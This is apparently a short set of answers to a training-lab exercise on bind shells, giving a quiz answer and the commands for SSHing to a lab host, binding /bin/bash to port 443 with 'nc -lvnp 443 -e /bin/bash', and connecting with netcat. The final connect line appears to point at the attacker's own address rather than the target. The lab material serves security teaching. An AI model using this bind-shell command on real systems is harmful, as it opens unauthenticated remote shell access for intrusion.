# Bind Shells

### Des is able to issue the command nc -lvnp 443 on a Linux target. What port will she need to connect to from her attack box to successfully establish a shell session?

```
443
```

### SSH to the target, create a bind shell, then use netcat to connect to the target using the bind shell you set up. When you have completed the exercise, submit the contents of the flag.txt file located at /customscripts.

```bash
ssh htb-student@10.129.201.134 
#1
sudo nc -lvnp 443 -e /bin/bash
#2
nc 10.10.14.179 443
```
